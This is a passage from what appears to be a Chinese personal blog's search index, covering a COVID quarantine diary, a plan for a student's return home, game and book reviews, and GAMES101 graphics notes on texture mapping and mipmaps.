社区：🤝不用。15573****** 静安医院救护车 周小军师傅 于是我从2点等到了3：40……期间我一度想要自己打电话跟司机确认，但又考虑到司机可能在开车，然后奥德赛太好玩（嗯，都怪任天堂），于是就拖到了3：40……🤪（我是**），当我终于打通了那个电话，司机却说：啊，你不是说不用来了吗。 好的，再一次验证了🤪（我是**）。经过一番解释，司机终于明白了，然后说会晚点到。 然后我又和社区那边确认了一次： 我：您好请问这边司机大概要多久才能到orz 社区：😂还没来吗？我问问 …… 社区：🤣在路上了 然后不知道过了多久（还好有宝贝陪我打电话哎嘿😋），终于在4：51分我和家人朋友们说我上车了，但是我并不知道上车的具体时间，因为我很有可能因为麻木的内心导致自己上车了结果忘记和家人朋友们说了，也可能当时正在和我的宝贝打电话然后忘记说了…… jo护车 你以为这样就结束了？我随手看了一眼地图上司机行驶的方向，突然意识到事情并不简单。 司机开往了隔离地点的反方向！反方向！……方向！……向！……………………………寄！ 好的司机还要去高铁站接人。更让我没想到的是，还要在高铁站等这俩老哥的车到站……. 好的原来只有我会担心司机在车站等我等太久，下车配合流调做完相关工作再联系司机以免司机等我orz 隔离酒店 还好隔离酒店离我家和我宝贝家都不算远，小电驴大概10来分钟？而且酒店的环境还算好，房间很大，而且还是“智能”酒店？（之后再吐槽orz） 酒店！ 然后桌上放了一张隔离单写道： 隔离要求！ 嗯，看到这几个字有菊花一紧，谢谢你们提醒我做提肛练习…… 但之后知道我们社区会让大白上门来给我们做核酸，所以我就开始了我的，每天，等着被社区投喂的废物生活，芜湖！o(￣▽￣)o 当晚由于到那已经是6：40了，没有给我们准备晚餐，于是被家人投喂了四个大肉粽~ 以及来自我的宝贝投喂的： 铁窗泪 铁窗泪一份！(#｀-_ゝ-) 谢谢你！女——盆——油——！ 入夜 安顿好自己之后，见了想见的人，吃了想吃的东西，美美的洗了个不限时的独立卫浴澡，回家的安逸让我之前紧绷的神经突然放松了下来，接踵而至的是困意，在等待着我的宝贝给我回电的过程中进入了梦乡。很抱歉在无数个夜里没能陪伴你入眠，很抱歉让你一个人经历情感挣扎的夜晚，好想好想你和我的家乡，我的家人。 Day One 清晨 今早我们都醒的很早，然后一起唠了唠昨晚发生的事，一起看了会儿书，我看的是特德姜的呼吸的第一篇：《商人和炼金术师之门》 呼吸 是一个故事套故事的类《一千零一夜》结构。对于人而言，过去、现在和未来究竟有什么不同。如果人能回到过去，也许你将以第三者的视角发现许多当时并未了解过的过去，那么未来和过去对人而言又有什么不同呢？ 午餐 没想到午餐还挺丰富！有小面包（dio狂喜），西瓜，汤，大荤+小荤+一素。 三菜一汤 然后点开了刚更的怪奇物语4下饭（？反向下饭） 探监 好的下午是愉快的探监时间！ 无法呼吸 她真的！好可爱啊！！！！！！！！（原地尖叫&amp;发春&amp;打call 🤤） 然后是长沙合照复刻！(/ω＼)……… (/ω•＼) 铁窗泪 Part Ⅱ 我的！可爱！大宝贝！ 午后 午后的阳光过于耀眼，于是拉上窗帘，看了几集怪奇物语（本来只想看一集….结果……嗯&lt;(＿ ＿)&gt;） 然后收到了来自宝贝的空投\\(@^0^@)/ 东方树叶茉莉花茶 * 2 打奶茶乌龙奶茶 * 1 自然拍派鱿鱼须+猪肉铺 波子汽水是⛩ 美汁源果粒橙 * 1 （+东方树叶混一混！） 小老板海苔 * 1 然后是快乐的晚餐时间： 湘菜湘菜，永远的爱 啊，这个小炒肉，这个酸辣鹅肠，这个娃娃菜！我好了！！！(｡･∀･)ﾉﾞ嗨 夜晚 晚上看怪奇物语居然有点害怕？然后给我的宝贝打了电话，然后开始回忆。 人类的记忆有限，一些好的坏的，都会随着时间的流逝被抹去，这才使得回忆对我们来说有了特殊的意义，他就像一个Check Point，保存一部分当时的感情，想法，画面，等等….，然后每次想起和你有关的事情，就有一种你还是住在我的回忆里不出来的感觉？然后是每天的“到点了！网抑云启动”时间，聊到两点，然后慢慢睡去。好想听你多说一些，但是时间还很长，我想听你慢慢说。晚安玛卡巴卡~(:3[____]","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"},{"name":"疫情返乡","slug":"Life/关于我们/疫情返乡","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/%E7%96%AB%E6%83%85%E8%BF%94%E4%B9%A1/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"返乡","slug":"返乡","permalink":"http://enderxiao.github.io/tags/%E8%BF%94%E4%B9%A1/"},{"name":"北京","slug":"北京","permalink":"http://enderxiao.github.io/tags/%E5%8C%97%E4%BA%AC/"},{"name":"疫情","slug":"疫情","permalink":"http://enderxiao.github.io/tags/%E7%96%AB%E6%83%85/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/tags/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"导师那些事","slug":"导师那些事","permalink":"http://enderxiao.github.io/tags/%E5%AF%BC%E5%B8%88%E9%82%A3%E4%BA%9B%E4%BA%8B/"}]},{"title":"525作战计划","slug":"525作战计划","date":"2022-05-25T14:23:29.000Z","updated":"2024-07-30T11:26:33.904Z","comments":true,"path":"2022/05/25/525作战计划/","permalink":"http://enderxiao.github.io/2022/05/25/525%E4%BD%9C%E6%88%98%E8%AE%A1%E5%88%92/","excerpt":"士可杀不可辱，不成功便成仁","text":"士可杀不可辱，不成功便成仁 背景 自2022年4月22日，朝阳区余松里社区出现第一例COVID-19阳性患者以来，我们经历了一个月的封校，这期间经历了身心的双重折磨，直到25号，接到了学校的通知。从26号至28号京外学生可以自主返校。这则通知对我们而言无非是黑暗中的光明，长夜后的黎明。史称525作战 计划内容 如果计划返乡，那么首先要做的是申请，根据525会议精神，返乡需要通过工大树进行返乡申请，确保： 返乡没有障碍（hy全称低风险，上海返乡只需7+7；易） 健康码绿码（绿码以外的健康码长啥样？易） 48小时核酸证明（宿舍每天免费核酸居然有点香；易） 导师同意（男上加男） 由于工大树的返乡申请功能还未上线，因此这些项目的申请形式还未知晓，初步判定为： 返乡政策截图 健康宝+行程卡截图 健康宝截图 导师同意聊天记录截图 导师同意 由于1-3项几乎不需要特意准备因此先从第四项开始： 请假话术： 1付老师您好我们这边今天开会收到通知说这三天京外学生可以返乡(红头文件)，我这边健康码没什么问题，然后家里的政策是7天集中隔离+7天居家隔离(政策允许)，我想申请这几天回家，家里学习环境要比宿舍好，不会耽误开发进度(说明利害)，所以我想申请返乡，您看可以吗(申请返乡) 老师询问了各项注意事项例如： 家乡防疫政策文件 会不会劝返 集中隔离费用问题 核酸检测安排 研究工作是否能保证 家庭详细住址 上述问题要提前准备好，以便让老师放心 然后导师提出如下需求： 1家乡本地县区和社区防疫政策有没有通知文件（要具体文件，要一个防疫部门能打通的电话）？会不会对北京回去的人劝返？集中隔离费用谁付？做几次核算检测？你如何到家？高铁、火车、还是飞机？到当地哪个站？落地站点防疫政策是什么（要本地宝上的政策，要一个电话）？从车站如何到家？ 以及预备方案： 1另外要做好最坏的打算，如果被劝返，自己要承担责任，包括被隔离期间酒店、餐饮、途中可能的运输费用等自己付费，这些都做好规划就没有问题， 那么总结一下需要准备的文件： 家乡县区防疫政策（文件+防疫部门电话） 家乡是否会对京区人员劝返 集中隔离的费用问题 核酸检测做几次 如何回家（飞机、火车、高铁） 回家到达的火车站 落地站点的防疫政策（本地宝政策+相关部门电话） 从车站如何到家 劝返后果自负，包括但不限于隔离期间的酒店、餐饮、运输费用 下面我们来总结一下需要的文件 防疫政策 政策文件： 国务院客户端：国务院客户端 交通部门疫情防控咨询电话：0734-12123 珠晖区疫情防控咨询电话：0734-3331359 蒸湘区疫情防控咨询电话：0734-8827106 高新区疫情防控咨询电话：0734-8351755 集贤服务站疫情防控咨询电话：0734-8226766 是否会对京区人员劝返 不会，通过疫情防控咨询电话查询得知 集中隔离费用问题 公费，通过电话查询 核酸检测次数 48小时核酸+第1、2、3、7、10、14天各进行1次核酸检测。 如何回家 27号Z285，11车25号下铺 21:05−&gt;13:17+121:05 -&gt; 13:17^{+1}21:05−&gt;13:17+1 软卧 到达车站 衡阳火车站 落地站点防疫政策 同衡阳 火车站位于珠晖区，疫情防控咨询电话：0734-3331359 交通部门疫情防控咨询电话：0734-12123 从车站如何回家 公交or跟随防控政策前往集中隔离点，需电话询问 携带物品 Asus电脑——工作 本体 鼠标 充电器 拓展坞 YOGA √ 本体 充电器 拓展坞 包装盒 ns——一大盒 √ 植村秀 √ 书 √ 耳机 √ 耳机包 3.5耳机线 typec充电器 XM4、H900N 小米Mix2s 充电头 相机 √ a6000 狗头 30 1.4 ipad 本体 充电器 iphone √ 本体 充电器 小米手环 √ 本体（随身） 充电器 √ 戎戎大礼包 √ 短袖*4 √2 裤子 米黄长裤 √ 墨绿长裤 √ 夏威夷短裤 √ 内裤 袜子 香水 √ 钱包 学生证 √ 5.26 19:27更新 想必看到上面这张图就明白发生了什么。但这整个过程却不能用一张图和三言两语说清楚，我们经历了太多太多，游击战、正面冲突、后方突袭，我们用尽了各种战术，敌人的顽强超过了我们的预期。但是看到这张图的一刻，请为我们自己欢呼一秒钟，为我们的胜利欢呼吧，我在此宣布525作战成功！我们是冠军！ 回家！","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"},{"name":"疫情返乡","slug":"Life/关于我们/疫情返乡","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/%E7%96%AB%E6%83%85%E8%BF%94%E4%B9%A1/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"返乡","slug":"返乡","permalink":"http://enderxiao.github.io/tags/%E8%BF%94%E4%B9%A1/"},{"name":"北京","slug":"北京","permalink":"http://enderxiao.github.io/tags/%E5%8C%97%E4%BA%AC/"},{"name":"疫情","slug":"疫情","permalink":"http://enderxiao.github.io/tags/%E7%96%AB%E6%83%85/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/tags/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"导师那些事","slug":"导师那些事","permalink":"http://enderxiao.github.io/tags/%E5%AF%BC%E5%B8%88%E9%82%A3%E4%BA%9B%E4%BA%8B/"}]},{"title":"中奖啦！","slug":"中奖啦","date":"2022-05-09T11:47:23.000Z","updated":"2024-07-30T11:26:33.922Z","comments":true,"path":"2022/05/09/中奖啦/","permalink":"http://enderxiao.github.io/2022/05/09/%E4%B8%AD%E5%A5%96%E5%95%A6/","excerpt":"起因是小戎参加Devolver Digital的话题抽奖活动被Roll中了,奖品是Devolver Digital发行的游戏任选一个,刚好Devolver Digital发行的很多游戏我也很喜欢,于是就有了这篇总结.","text":"起因是小戎参加Devolver Digital的话题抽奖活动被Roll中了,奖品是Devolver Digital发行的游戏任选一个,刚好Devolver Digital发行的很多游戏我也很喜欢,于是就有了这篇总结. Devolver Digital TREK TO YOMI 《黄泉之路》（Trek to Yomi）是一款致敬了上世纪60年代日本黑白剑戟片的横版动作游戏，视觉十分出色 内核是一款动作游戏. 游戏以江户时代为背景，讲述了主角弘树继承师傅的遗志，为了保护村子免于强盗的屠戮，主动出击，追缉恶徒的故事。游戏在收集品中也多次提及了日本神话中伊邪纳岐、伊邪那美与黄泉之国的神话传说，仿佛是对主角后续的曲折经历有所暗示。 据说上手有点难，作为动作战斗手感却被很多人诟病。 Weird Wets 诡野西部》是一款西部题材的战术角色扮演游戏，本作开发团队曾共同创作了《耻辱》(Dishonored)与《掠食》(Prey)两款知名游戏。执法人员和西部枪侠与各类奇幻生物同处西部边境。 是加入了奇幻属性的西部风格 被吐槽的点也是战斗手感不佳 INSCRYPTION 邪恶铭刻是一款以心里恐怖、密室逃脱为原内容的卡牌构筑类冒险游戏，画风很有压迫感 我觉得爱玩皇权的话，这款应该会更让你喜欢上hhhh igf+gdca双奖足以说明它玩法的普适性。缺点的话可能会有一丝丝恐怖？ My Friend Pedro 搞笑平台动作游戏 扮演一位黄衣枪手，利用子弹时间进行角度刁钻的击杀。 关卡设计循序渐进，正反馈明显，玩的很爽且不会疲惫 KATANA Zero 赛博朋克背景下的武士游戏，也是我自己玩通了的一款游戏，赛博朋克+武士这两个题材本身就很吸引我。 它实际上是一款玩起来接近平台跳跃的动作游戏。玩家需要手握武士刀，利用子弹时间来与各种拿抢突突突的敌人对战。主角是一个失意的改造人，超能力就是子弹时间。该游戏的故事也非常有意思，寻找主角的身世是这个游戏故事的主线。 我自己玩的话就觉得故事很吸引人，当时连续玩了两天把它通关了（根本没有停下来hhhh），并且玩法很吸引我，当我用一连串流畅的操作把房间里几十个带枪的敌人撩到的时候会给我很强的正反馈，关卡难度还算循序渐进，中间会有一些地方感觉突然过于难了，不提升自己的反应速度没办法过。 缺点是上手有一定难度，且故事并没有写完，开发者承诺会带来后续剧情的DLC，但是鸽了原定时期，不知道什么时候能上hou’xu","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"Games","slug":"Games","permalink":"http://enderxiao.github.io/tags/Games/"},{"name":"Devolver Digital","slug":"Devolver-Digital","permalink":"http://enderxiao.github.io/tags/Devolver-Digital/"}]},{"title":"三秒导读","slug":"三秒导读","date":"2022-04-09T11:35:51.000Z","updated":"2024-07-30T11:26:33.921Z","comments":true,"path":"2022/04/09/三秒导读/","permalink":"http://enderxiao.github.io/2022/04/09/%E4%B8%89%E7%A7%92%E5%AF%BC%E8%AF%BB/","excerpt":"","text":"3秒导读 一束光在3秒钟能够走完90万千米。打开书之前，请想象自己是一道光。如果是光，我们应该如何行走。可能我们会穿过一个狭小的缝隙，撞向一个光滑的镜面，或是穿过泛着波光的湖水。事实上无论我们的周围发生过什么，都会被光所记录，它就像是一个绝对公正的旁观者。然后打开这本书，让我们成为一束光，以绝对中立的视角去审视一场案件的发生。 3秒使用的文字非常有限，大量地使用图像去营造悬疑的感觉。但图像的表达会比文字更为具象，作者在这里巧妙地使用了光线的视角，对信息量进行了限制，同时，利用光线的镜面反射又使得2维的世界带有了3维的质感，让线索有了更多的藏匿地，更加扑朔迷离。 3是最小的奇素数，奇素数总能勾起人脑海里不和谐的印象，在这本书中，他总会以奇妙的方式出现在阅读回顾的过程中，比如书中总共描述了三件扑朔迷离的事件，每一页都包含9个分镜，全书总共72页…。 3秒的结尾并没有给出具体的事情经过，也许作者相信读者实现阅读的同时真相也将浮出水面。那么你的答案是什么呢，我已经迫不及待想跟你讨论了！","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"导读","slug":"Life/导读","permalink":"http://enderxiao.github.io/categories/Life/%E5%AF%BC%E8%AF%BB/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"《3秒》","slug":"《3秒》","permalink":"http://enderxiao.github.io/tags/%E3%80%8A3%E7%A7%92%E3%80%8B/"},{"name":"导读","slug":"导读","permalink":"http://enderxiao.github.io/tags/%E5%AF%BC%E8%AF%BB/"},{"name":"马克·安托万·马修","slug":"马克·安托万·马修","permalink":"http://enderxiao.github.io/tags/%E9%A9%AC%E5%85%8B%C2%B7%E5%AE%89%E6%89%98%E4%B8%87%C2%B7%E9%A9%AC%E4%BF%AE/"}]},{"title":"Games101_9TO16","slug":"Games101-9TO16","date":"2022-03-17T06:24:37.000Z","updated":"2024-07-30T11:26:33.908Z","comments":true,"path":"2022/03/17/Games101-9TO16/","permalink":"http://enderxiao.github.io/2022/03/17/Games101-9TO16/","excerpt":"继续Games101 1-8的内容，从纹理映射开始","text":"继续Games101 1-8的内容，从纹理映射开始 纹理映射 三角形内插值：重心坐标 下面提出两个问题： 为什么要做插值 因为需要在三角形内得到平滑过渡的一组值 需要插哪些值 纹理，颜色，法线等等 如何插值 重心坐标（Barycentric Coordinates） 重心坐标 对于一个已知所有顶点的三角形，与该三角形共面的任意一点，都可以表示为这三个顶点的加权和。且满足系数之和等于1。另外，如果三个系数均为非负，则该点位于三角形内部。 则这三个系数组成的坐标为重心坐标。 重心坐标求法 对于三角形内任意一点，我们可以通过连接该点与三角形三个顶点，得到三个三角形，如下图所示： 其中AiA_iAi​表示与角i相对的三角形的面积。那么该点的重心坐标可以通过如下公式结算得到： α=AAAA+AB+ACβ=ABAA+AB+ACγ=ACAA+AB+AC\\alpha = \\frac{A_A}{A_A + A_B + A_C} \\\\ \\beta = \\frac{A_B}{A_A + A_B + A_C} \\\\ \\gamma = \\frac{A_C}{A_A + A_B + A_C} α=AA​+AB​+AC​AA​​β=AA​+AB​+AC​AB​​γ=AA​+AB​+AC​AC​​ 因此我们可以得到一个特殊点的重心坐标。即三角形重心的重心坐标。因为三角形重心具有平分三角形面积的性质，故重心的重心坐标为：(1/3,1/3,1/3) 除了使用面积进行计算我们还可以通过如下方式得到更直观的坐标运算来得到重心坐标： 对于上图中三角形内的点(x,y)，我们令其为Ｐ，如果我们把三角形ABC看成坐标系 ，A为原点，基为AB⃗，AC⃗\\vec{AB}，\\vec{AC}AB，AC，那么对于向量AP我们可以使用如下方式: AP⃗=uAB⃗+bAC⃗\\vec{AP} = u\\vec{AB} + b\\vec{AC}AP=uAB+bAC 移项得到： uAB⃗+bAC⃗+PA⃗=0u\\vec{AB} + b\\vec{AC} + \\vec{PA} = 0uAB+bAC+PA=0 对于二维三角形，我们可以得到如下形式的式子： uAB⃗x+vAC⃗x+PA⃗x=0uAB⃗y+vAC⃗y+PA⃗y=0u\\vec{AB}_x + v\\vec{AC}_x + \\vec{PA}_x = 0 \\\\ u\\vec{AB}_y + v\\vec{AC}_y + \\vec{PA}_y = 0 uABx​+vACx​+PAx​=0uABy​+vACy​+PAy​=0 此外还可以将其写为矩阵形式： (uv1)(AB⃗xAC⃗xPA⃗x)=0(uv1)(AB⃗yAC⃗yPA⃗y)=0\\left( \\begin{matrix} u &amp; v &amp; 1 \\end{matrix} \\right) \\left( \\begin{matrix} \\vec{AB}_x \\\\ \\vec{AC}_x \\\\ \\vec{PA}_x \\end{matrix} \\right) = 0 \\\\ \\left( \\begin{matrix} u &amp; v &amp; 1 \\end{matrix} \\right) \\left( \\begin{matrix} \\vec{AB}_y \\\\ \\vec{AC}_y \\\\ \\vec{PA}_y \\end{matrix} \\right) = 0 (u​v​1​)⎝⎛​ABx​ACx​PAx​​⎠⎞​=0(u​v​1​)⎝⎛​ABy​ACy​PAy​​⎠⎞​=0 可见我们需要计算的向量(u,v,1)垂直与上述两个向量，因此可以使用上述两个向量的叉乘得到我们要求的系数。 我们还可以得到如下公式： α=−(x−xB)(yC−yB)+(y−yB)(xC−xB)−(xA−xB)(yC−yB)+(yA−yB)(xC−xB)β=−(x−xC)(yA−yC)+(y−yC)(xA−xC)−(xB−xC)(yA−yC)+(yB−yC)(xA−xC)γ=1−α−β\\alpha = \\frac{-(x-x_B)(y_C - y_B) + (y - y_B)(x_C - x_B)}{-(x_A - x_B)(y_C - y_B) + (y_A - y_B)(x_C - x_B)} \\\\ \\beta = \\frac{-(x-x_C)(y_A - y_C) + (y - y_C)(x_A - x_C)}{-(x_B - x_C)(y_A - y_C) + (y_B - y_C)(x_A - x_C)} \\\\ \\gamma = 1 - \\alpha - \\beta α=−(xA​−xB​)(yC​−yB​)+(yA​−yB​)(xC​−xB​)−(x−xB​)(yC​−yB​)+(y−yB​)(xC​−xB​)​β=−(xB​−xC​)(yA​−yC​)+(yB​−yC​)(xA​−xC​)−(x−xC​)(yA​−yC​)+(y−yC​)(xA​−xC​)​γ=1−α−β 至此，三角形内部的任意点，都能通过三个点的线性组合来得到该点的位置。 推到： 图形学基础知识：重心坐标（Barycentric Coordinates）_王王王渣渣的博客-CSDN博客_重心坐标 但需要注意的是，重心坐标并不具有投影不变性 对于投影进行插值，应该先进行投影，然后根据投影逆运算计算出该像素点在三维空间中的坐标，然后进行插值，再将结果放回投影后的像素点 注意，重心坐标在映射过程中并非保持不变，所以需要在对应时间计算对应的重心坐标来做插值，不能随意复用！ 映射过程伪代码如下： 1234foreach rasterized screen sample(x,y) //通常来说是一个像素的中心 (u,v) = evaluate texture coordinate at (x,y) //用重心坐标插值 texcolor = texture,sample(u,v); 1111set sample&#x27;s color to texture; //作为漫反射系数 应用纹理 简答纹理映射：漫反射颜色 对于每一个投影屏幕中的采样点，通过插值计算出他的坐标(u,v) 在纹理图上查询纹理值 将该纹理直（例如漫反射系数Kd）应用到模型中。 但是如果使用上述简单的方式进行纹理应用，将存在下文将要讨论的几个问题： 纹理放大（Texture Magnification） 即纹理本身过小，分辨率过低。 此处为了区分模型上的像素与纹理上的像素，我们引入一个概念：Texel，指纹理上的像素，即纹理像素或纹素 当查询纹理时候，所给坐标为非整数坐标，因此通常会采取一些方法来得到它的纹理值，常见方法有： 最近邻Nearest 双线性插值Bilinear 双向三次插值Bicubic 纹理放大（Hard Case） 即纹理过大，分辨率过高 当纹理过大时，映射到模型上会产生走样的问题，如下图所示，远处产生了摩尔纹，近处产生了锯齿： 产生摩尔纹的原因是像素不够多，而由于近大远小，远处会有更多的像素被同一纹素的纹理所覆盖，如下图所示： 此处引出一个计算几何中的经典问题：点查询与区域查询（Point Query &amp; Range Query） 其中范围查询又分为很多种，例如平均范围查询，最大最小值范围查询（如线段树） 双线性插值 对于一个非整数点，考虑它的四领域，分别计算你该点到四领域中的Texel的水平与数值距离，并分别进行一次线性插值。 线性插值：对于已知的两个点A、B，如果某一点距离A点的距离为x，则该点的值可以表示为： lerp(x,A,B)=A+x(B−A)lerp(x,A,B) = A + x(B - A)lerp(x,A,B)=A+x(B−A) 具体过程如图所示： 双向三次插值 与双向线性插值的区别在于去该点的16领域，这16个领域进行水平竖直的三次插值 MipMap 数据结构 允许进行一种快速，近似，正方形(fast,approx,square)的范围查询（Range Query） 范围查询：即给定一个区域，立即可以得到该区域的信息，例如平均值、最大值、最小值，数据结构中的经典算法线段树就可以用来解决区间查询的问题。 Mip来自于拉丁语中的“multum in parvo”，即小空间的多层堆叠 MipMap即将原始图片进行模糊操作，构成类似图像金字塔的结构： 随着层数增加1，图片的长宽缩小一半。 因此层数为Log2(n)（n为分辨率，假设图片为正方形） 可知MipMap是可以提前生成的。 那么使用MipMap算法产生的额外存储是多少呢？ 由于每一层的长宽是上一层的一半，因此当前层的存储空间是上一层的1/4，因此每一层占用空间形成一个等比数列。因此总占用空间转化为一个等比数列求和问题： n∗n+(n∗n)/4+(n∗n)/16+...S=n∗n(1−(1/4)log2(n))1−1/4S=n∗n1−(1/2)2log2(n)3/4S=n∗n1−(1/(2log2(n2))3/4S=n∗n1−1/n23/4=n2n2−1n23/4S=n2−13/4S=4/3(n2−1)n*n + (n*n)/4 + (n*n)/16 + ... \\\\ S = n*n \\frac {(1 - (1/4)^{log_2(n)})}{1-1/4} \\\\ S = n*n \\frac {1-(1/2)^{2log_2(n)}}{3/4} \\\\ S = n*n \\frac {1-(1/(2^{log_2(n^2)})}{3/4} \\\\ S = n*n \\frac {1- 1/n^2}{3/4} = n^2 \\frac {\\frac{n^2 - 1}{n^2}}{3/4} \\\\ S = \\frac {n^2 - 1}{3/4} \\\\ S = 4/3 (n^2 - 1) n∗n+(n∗n)/4+(n∗n)/16+...S=n∗n1−1/4(1−(1/4)log2​(n))​S=n∗n3/41−(1/2)2log2​(n)​S=n∗n3/41−(1/(2log2​(n2))​S=n∗n3/41−1/n2​=n23/4n2n2−1​​S=3/4n2−1​S=4/3(n2−1) 因此该算法的空间复杂度为O((4/3)n2)O((4/3)n^2)O((4/3)n2)，即只需比原空间多出1/3的空间即可。 查询 那么给出一个像素点该如何查询该像素点对应的纹素平均值呢？ 对于一个像素点，我们计算他在像素平面内与他相邻的两个像素的距离，记为x，y。然后通过微分的方法计算其在纹素域的距离。计算公式如下： L=max((dudx)2+(dvdx)2,(dudy)2+(dvdy)2)L = max(\\sqrt{(\\frac{du}{dx})^2 + (\\frac{dv}{dx})^2}, \\sqrt{(\\frac{du}{dy})^2 + (\\frac{dv}{dy})^2})L=max((dxdu​)2+(dxdv​)2​,(dydu​)2+(dydv​)2​) 然后选取其中的最大者作为近似正方形的边长，然后通过取对数计算要取的层级： D=log2(L)D = log_2(L)D=log2​(L) 将该算法用于渲染后可以得到如下结果： 其中越暖的颜色代表使用了越低层的贴图。 Trilinear Interpolation 由于MipMap提供了多层级，相当于提升了一个维度，因此我们可以进行三线性插值，例如下图中描述的情况： 我们可以在相邻两层之间进行双线性插值，然后再对两层的插值结果再进行一次线性插值。 使用三线性插值后得到的贴图如下所示： 使用三线性插值的MipMap得到的结果如下： 可见远处会产生过模糊（OverBlur）的效果。原因在于MipMap值适用于正方形区域的查询，且只是近似，因此远处由于视角拉伸产生的非正方形区域的纹理产生了过模糊，下面介绍一个新的方法，能过部分解决这种问题：各向异性过滤（Anisotropic Filtering） Anisotropic Filtering 各向异性过滤的思路事实上与Mipmap相同，都是通过预先计算不同尺寸的贴图来进行近似，只不过使用各向异性生成的贴图如下所示： 这组贴图我们称为Ripmaps，可以见该方法生成的贴图集合是Mipmap的超集，取该图中的对角线上的所有图片，就得到了Mipmap，因此又该图可知Ripmaps的开销将是原本的4倍。其中各项异性指考虑各个方向上的差异性。 该方法在Mipmap的基础上增加了单独的长宽变化，每一行上的图片长不变，宽变窄；每一列上的图片宽不变，高变窄。 为什么各向异性的效果会比单纯的Mipmap好？ 对于如下图中的纹理映射，由于视线的问题，并不是所有纹理都是方方正正的被映射到物体上的： 因此对于矩形区域，各向异性过滤会得到更好的近似结果。 此外还有一些类似的方法能解决别的形状的纹理映射问题，比如EWA filtering EWA filtering 该算法使用不同的圆形来覆盖不规则图像，使用多次查询达到近似的效果： 各种贴图 学完纹理映射之后，我们来思考一下什么是纹理。 在现代GPU中，纹理事实上就是内存中的一块数据（memory）+ 对于这块数据的查询方法（range query(filtering)） 环境光照（Environment Map） 假设光源无限远，只记录光照的方向信息，这种贴图被称作环境光贴图 例如 Utah Teaport 犹他茶壶；Stanford Bunny 斯坦福兔子 球面环境映射 Spherical Environment Map 球心为世界中心。类比地球仪展开铺平，存在纹理的拉升扭曲问题，例如将地球仪展开后南极洲在视觉上很小，解决方法：Cube Map 立方体贴图 Cube Map 将环境光照信息记录在一个立方体表面上，但会需要额外判断某一方向上的光照应该记录在立方体的哪个面上， 计算量更大 凹凸贴图 记录了纹理的高度移动，并不改变原来模型的集合信息，通过法线扰动，得到模拟出来的着色效果，以假乱真 计算法线的方法 Bump Mapping 对于每个像素，记录该店的扰动 在贴图中，每个像素定义一个高度差 shading时根据该高度差调整法线的方向 计算方法 设原本表面的某像素点p的法线n(p) = (0,1) 那么该点的梯度为：dp=c∗h(p+1)−h(p)1dp = c * \\frac{h(p+1) - h(p)}{1}dp=c∗1h(p+1)−h(p)​，其中h为高度函数，c为影响常量 那么受到扰动后的法线为n(p)=(−dp,1).normalized()n(p) = (-dp,1).normalized()n(p)=(−dp,1).normalized()即原法线旋转90° UV下的法线算法： 局部坐标下，n=(−dpdu,−dpdv,1).normalizedn = (-\\frac{dp}{du}, -\\frac{dp}{dv}, 1).normalizedn=(−dudp​,−dvdp​,1).normalized 位移贴图 与凹凸贴图类似，但位移贴图是真的改变了几何信息，去对模型的顶点做位移，会比凹凸贴图更加逼真，但对模型的 精度（三角面数量）要求更高，并且运算量也会随之上升 DirectX有Dynamic的插值法，根据需要对模型做插值，看情况决定模型的细致程度（动态曲面细分） 凹凸贴图vs.位移贴图 程序纹理 三维的纹理，并非真正生成了纹理的图，而是定义控件中任意点的颜色，定义三维空间中的噪声函数，再通过映射，得到预想的效果 预计算着色 将环境光进行预计算处理，再附在原先纹理上做一层遮蔽，再将纹理贴到模型上 三维渲染 广泛应用于物体渲染，如核磁共振等扫描后得到体积信息，通过这些信息进行渲染 程序纹理 预计算着色 三维渲染 几何 几何的表达方式 隐式几何 用空间中的满足一定条件的点的集合来表示面，隐式几何不会表示点的具体位置信息，而是告诉我们这些点满足的函数关系 我们很难看出隐式想表达的形状是什么，但对于判断点的位置关系（在内，在外还是在表面）会很方便 代数曲面 CSG构造实体几何 通过布尔运算将多个隐式几何进行结合 ℵ\\alephℵ 距离函数表示法 对于任意几何，不直接描述表面，而是描述空间中任何一个点到这个表面的最近距离（可正可负） 该方法在做blending（融合）时能达到很好的效果： 距离函数：SDF(Signed Distance Functions) 上图中第一行是直接使用隐式函数表示平面AB后进行融合的结果 第二行使用SDF表示平面AB后进行融合的结果 本例中融合被定义为对于位置的点的函数值相加 第二行中函数值为0的地方就是表面。 水平集（Level Set） 与距离函数的思想类似，在地理上类似等高线的定义 水平集与纹理的结合应用：CT扫描 分形几何（Fractals） 自相似几何，类似于递归，但由于变化频率过高，渲染时会产生强烈的走样，很难控制形状 中间的蔬菜中文名为：宝塔花菜 显式几何 直接给出点的位置，或者可以进行参数映射；然而想要判断内外时，显式的表达就很难进行表示 点云（Point Cloud） 用空间中一堆点的集合来表示物体，只要点足够密集，就看不到点与点之间的空隙，理论上可以表示任何几何，通常三维扫描得到的结果就是点云（点云可以转变为三角形） 多边形面（Polygon Mesh） 或许是目前最为广为流传的三维几何表达方式 ℵ\\alephℵThe Wavefront Object 